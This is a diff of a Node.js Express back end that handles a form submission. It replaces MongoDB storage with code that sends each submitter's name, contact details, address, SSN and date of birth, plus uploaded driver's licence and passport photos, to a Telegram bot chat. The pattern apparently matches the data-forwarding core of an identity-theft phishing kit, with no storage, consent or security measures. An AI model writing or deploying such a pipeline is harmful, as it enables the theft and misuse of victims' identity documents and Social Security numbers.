@@ -1,96 +1,88 @@
 const express = require('express');
-const mongoose = require('mongoose');
 const multer = require('multer');
-const cors = require('cors');
+const axios = require('axios');
+const fs = require('fs');
 const path = require('path');
-const nodemailer = require('nodemailer');
-require('dotenv').config(); // Load environment variables from .env file
+const FormData = require('form-data');
+require('dotenv').config();
 
 const app = express();
-const port = process.env.PORT || 3001;
+const PORT = process.env.PORT || 3004;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Middleware
-app.use(cors());
-app.use(express.json());
-app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
-// Connect to MongoDB
-mongoose.connect(process.env.MONGO_URI || 'mongodb://localhost:27017/formData', {
-  useNewUrlParser: true,
-  useUnifiedTopology: true
-})
-.then(() => console.log('MongoDB connected'))
-.catch(err => console.error('MongoDB connection error:', err));
 
-// Multer setup
+
+// Setup multer for file uploads
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
     cb(null, 'uploads/');
   },
   filename: function (req, file, cb) {
-    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
-    cb(null, uniqueSuffix + '-' + file.originalname);
+    cb(null, Date.now() + '-' + file.originalname);
   }
 });
-
 const upload = multer({ storage: storage });
 
-// Schema and model
-const formDataSchema = new mongoose.Schema({
-  firstName: String,
-  lastName: String,
-  middleName: String,
-  phoneNumber: String,
-  email: String,
-  address: String,
-  ssn: String,
-  dob: String,
-  gender: String,
-  driversLicense: String,
-  passportPhoto: String
-});
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-const FormData = mongoose.model('FormData', formDataSchema);
-
-// Routes
+// Route to handle form submission
 app.post('/submit-form', upload.fields([{ name: 'driversLicense' }, { name: 'passportPhoto' }]), async (req, res) => {
   try {
-    const { firstName, lastName, middleName, phoneNumber, email, address, ssn, dob, gender } = req.body;
-    const driversLicense = req.files['driversLicense'] ? req.files['driversLicense'][0].path : '';
-    const passportPhoto = req.files['passportPhoto'] ? req.files['passportPhoto'][0].path : '';
+    const formData = req.body;
+    const driversLicensePath = req.files['driversLicense'] ? req.files['driversLicense'][0].path : null;
+    const passportPhotoPath = req.files['passportPhoto'] ? req.files['passportPhoto'][0].path : null;
 
-    const newFormData = new FormData({
-      firstName, lastName, middleName, phoneNumber, email, address, ssn, dob, gender, driversLicense, passportPhoto
+    const message = `
+    First Name: ${formData.firstName}
+    Last Name: ${formData.lastName}
+    Middle Name: ${formData.middleName}
+    Phone Number: ${formData.phoneNumber}
+    Email: ${formData.email}
+    Address: ${formData.address}
+    SSN: ${formData.ssn}
+    Date of Birth: ${formData.dob}
+    Gender: ${formData.gender}
+    `;
+
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message
     });
 
-    await newFormData.save();
-    res.status(200).send('Form data submitted successfully.');
+    if (driversLicensePath) {
+      const driversLicenseStream = fs.createReadStream(path.join(__dirname, driversLicensePath));
+      const driversLicenseFormData = new FormData();
+      driversLicenseFormData.append('chat_id', TELEGRAM_CHAT_ID);
+      driversLicenseFormData.append('photo', driversLicenseStream);
+
+      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, driversLicenseFormData, {
+        headers: driversLicenseFormData.getHeaders()
+      });
+    }
+
+    if (passportPhotoPath) {
+      const passportPhotoStream = fs.createReadStream(path.join(__dirname, passportPhotoPath));
+      const passportPhotoFormData = new FormData();
+      passportPhotoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+      passportPhotoFormData.append('photo', passportPhotoStream);
+
+      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, passportPhotoFormData, {
+        headers: passportPhotoFormData.getHeaders()
+      });
+    }
+
+    res.status(200).send('Form submitted successfully.');
   } catch (error) {
-    console.error('Error submitting form data:', error);
-    res.status(500).send('Error submitting form data.');
+    console.error('Error submitting form:', error);
+    res.status(500).send('Failed to submit form.');
   }
 });
 
-app.get('/form-data', async (req, res) => {
-  try {
-    const formData = await FormData.find();
-    res.status(200).json(formData);
-  } catch (error) {
-    console.error('Error fetching form data:', error);
-    res.status(500).send('Error fetching form data.');
-  }
-});
 
-app.delete('/form-data/:id', async (req, res) => {
-  try {
-    await FormData.findByIdAndDelete(req.params.id);
-    res.status(200).send('Form data deleted successfully.');
-  } catch (error) {
-    console.error('Error deleting form data:', error);
-    res.status(500).send('Error deleting form data.');
-  }
-});
-
-app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
+// Start the server
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
 });
